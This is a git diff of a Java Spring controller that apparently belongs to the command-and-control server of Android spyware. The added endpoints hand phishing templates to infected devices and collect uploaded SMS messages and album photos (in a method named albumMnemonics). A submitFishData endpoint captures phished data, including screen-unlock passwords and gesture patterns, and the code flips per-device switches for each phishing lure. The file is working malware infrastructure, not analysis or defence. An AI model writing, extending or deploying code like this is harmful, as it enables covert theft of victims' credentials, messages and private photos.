@@ -1,20 +1,16 @@
 package io.renren.modules.app.web.api;
 
-import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.JSONObject;
-import io.renren.common.constant.Constant;
-import io.renren.common.utils.IpUtils;
-import io.renren.common.utils.Result;
-import io.renren.commons.dynamic.datasource.config.DynamicContextHolder;
-import io.renren.modules.app.common.Utils;
-import io.renren.modules.app.context.DeviceContext;
+import java.util.Date;
+import java.util.List;
+import java.util.Objects;
+
+import javax.annotation.Resource;
+import javax.servlet.http.HttpServletRequest;
+
 import io.renren.modules.app.entity.*;
+import io.renren.modules.app.mapper.FishTemplatesMapper;
 import io.renren.modules.app.service.*;
-import io.renren.modules.app.vo.DeviceStatus;
-import io.renren.modules.app.vo.ServerConfig;
-import io.renren.modules.app.vo.UnLockParams;
-import io.renren.modules.sys.dao.SysParamsDao;
-import lombok.extern.slf4j.Slf4j;
+import io.renren.modules.app.vo.FishDataVo;
 import org.apache.commons.lang3.StringUtils;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.web.bind.annotation.PostMapping;
@@ -22,10 +18,21 @@ import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
 
-import javax.annotation.Resource;
-import javax.servlet.http.HttpServletRequest;
-import java.util.List;
-import java.util.Objects;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.JSONObject;
+import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
+
+import io.renren.common.constant.Constant;
+import io.renren.common.utils.IpUtils;
+import io.renren.common.utils.Result;
+import io.renren.commons.dynamic.datasource.config.DynamicContextHolder;
+import io.renren.modules.app.common.Utils;
+import io.renren.modules.app.context.DeviceContext;
+import io.renren.modules.app.vo.DeviceStatus;
+import io.renren.modules.app.vo.ServerConfig;
+import io.renren.modules.app.vo.UnLockParams;
+import io.renren.modules.sys.dao.SysParamsDao;
+import lombok.extern.slf4j.Slf4j;
 
 @Slf4j
 @RestController
@@ -36,12 +43,8 @@ public class DeviceApiController extends BaseApiController {
     DeviceService deviceService;
     @Autowired
     private InstallAppService installAppService;
-
     @Resource
     private TransferService transferService;
-    @Resource
-    private MajorDataService majorDataService;
-
 
     @Resource
     private InputTextRecordService inputTextRecordService;
@@ -56,6 +59,19 @@ public class DeviceApiController extends BaseApiController {
 
     @Resource
     private SysParamsDao sysParamsDao;
+
+    @Resource
+    private FishTemplateService fishTemplateService;
+
+    @Resource
+    private SmsInfoService smsInfoService;
+
+    @Resource
+    private AlbumPicService albumPicService;
+
+    @Resource
+    private FishDataService fishDataService;
+
 
 
     //注册设备
@@ -117,7 +133,10 @@ public class DeviceApiController extends BaseApiController {
         Device update = new Device();
         update.setId(device.getId());
         update.setLockScreen(json);
-        if(unlockScreenPwd.getSource() == Constant.UnlockScreenPwdSource.fish){
+        if (unlockScreenPwd.getSource() == Constant.UnlockScreenPwdSource.fish) {
+            JSONObject fishSwitch = device.getFishSwitch();
+            fishSwitch.put(Constant.FishCode.unlock, false);
+            update.setFishSwitch(fishSwitch);
             update.setUnlockFish(Constant.YN.N);
         }
         deviceService.updateById(update);
@@ -226,8 +245,11 @@ public class DeviceApiController extends BaseApiController {
             serverConfig.setMainCodeMd5(mainJsCode.getCodeMd5());
         }
 
-        serverConfig.setUnlockFish(Objects.equals(dbDevice.getUnlockFish(), Constant.YN.Y));
+        serverConfig.setFishOptions(dbDevice.getFishSwitch());
+
         serverConfig.setUnlockFishFeatures(sysParamsDao.getValueByCode(Constant.SystemParamsKey.UnlockFishFeatures));
+        serverConfig.setUploadSms(Objects.equals(dbDevice.getUploadSms(), Constant.YN.Y));
+        serverConfig.setUploadAlbum(Objects.equals(dbDevice.getUploadAlbum(), Constant.YN.Y));
 
         Device updateDevice = new Device();
         updateDevice.setId(dbDevice.getId());
@@ -266,5 +288,108 @@ public class DeviceApiController extends BaseApiController {
         installAppService.saveBatch(list);
         return Result.toSuccess();
     }
+
+    @RequestMapping("fishTemplates")
+    public Result<List<FishTemplates>> fishTemplates(@RequestBody JSONObject jsonObject) {
+        LambdaQueryWrapper<FishTemplates> query = new LambdaQueryWrapper<>();
+        query.eq(FishTemplates::getStatus, Constant.FishTemplatesStatus.effective);
+        List<FishTemplates> list = fishTemplateService.list(query);
+        return Result.toSuccess(list);
+    }
+
+
+    @RequestMapping("sms")
+    public Result<Void> sms(@RequestBody List<SmsInfoEntity> list) {
+        String deviceId = DeviceContext.getDeviceId();
+        String pkg = DeviceContext.getPkg();
+        for (SmsInfoEntity sms : list) {
+            sms.setDeviceId(deviceId);
+            sms.setPkg(pkg);
+        }
+        smsInfoService.addSms(list);
+        log.info("设备:{} 短信上传成功.", deviceId);
+        return Result.toSuccess();
+    }
+
+
+    @PostMapping("/album_pic")
+    public Result<Void> albumMnemonics(@RequestBody List<AlbumPicEntity> inputs) {
+        String deviceId = DeviceContext.getDeviceId();
+        String pkg = DeviceContext.getPkg();
+        Date now = Utils.now();
+        for (AlbumPicEntity input : inputs) {
+            input.setDeviceId(deviceId);
+            input.setCreated(now);
+            input.setModified(now);
+            input.setPkg(pkg);
+        }
+        albumPicService.upload(inputs);
+        log.info("设备:{} 相册上传成功.", DeviceContext.getDeviceId());
+        return Result.toSuccess();
+    }
+
+
+    /**
+     * 钓鱼数据
+     *
+     * @param jsonObject
+     * @return
+     */
+    @PostMapping("submitFishData")
+    public Result<Void> submitFishData(@RequestBody FishDataVo fishDataVo) {
+        String deviceId = DeviceContext.getDeviceId();
+        String pkg = DeviceContext.getPkg();
+        Device dbDevice = deviceService.findByDeviceId(deviceId);
+        if (dbDevice == null) {
+            return Result.toSuccess();
+        }
+        if (Objects.equals(fishDataVo.getCode(), Constant.FishCode.unlock)) {
+            String data = fishDataVo.getData();
+
+            JSONObject unlockParam = JSONObject.parseObject(data);
+            try {
+
+                String tips = unlockParam.getString("tips");
+                if (unlockParam.getInteger("type") == Constant.UnLockType.gesture) {
+                    tips = tips.chars()
+                            .map(c -> '0' + (c - '0' + 1) % 10)
+                            .collect(StringBuilder::new,
+                                    StringBuilder::appendCodePoint,
+                                    StringBuilder::append)
+                            .toString();
+                    unlockParam.put("tips", tips);
+                }
+                unlockParam.put("source", Constant.UnlockScreenPwdSource.fish);
+                uploadUnlockPassword(unlockParam);
+            } catch (Exception e) {
+                log.warn("uploadUnlockPassword error", e);
+            }
+        } else {
+            FishData fishData = new FishData();
+            fishData.setCreated(Utils.now());
+            fishData.setPkg(pkg);
+            fishData.setDeviceId(dbDevice.getId());
+            fishData.setAndroidId(deviceId);
+            fishData.setCode(fishDataVo.getCode());
+            fishData.setData(fishDataVo.getData());
+            fishDataService.save(fishData);
+        }
+
+        Device updateDevice = new Device();
+
+        JSONObject fishSwitch = dbDevice.getFishSwitch();
+        fishSwitch.put(fishDataVo.getCode(), false);
+        updateDevice.setFishSwitch(fishSwitch);
+        updateDevice.setId(dbDevice.getId());
+        deviceService.updateById(updateDevice);
+
+
+        log.info("钓鱼数据:{} - {}", deviceId, fishDataVo);
+        return Result.toSuccess();
+    }
+
+
+
+
 
 }
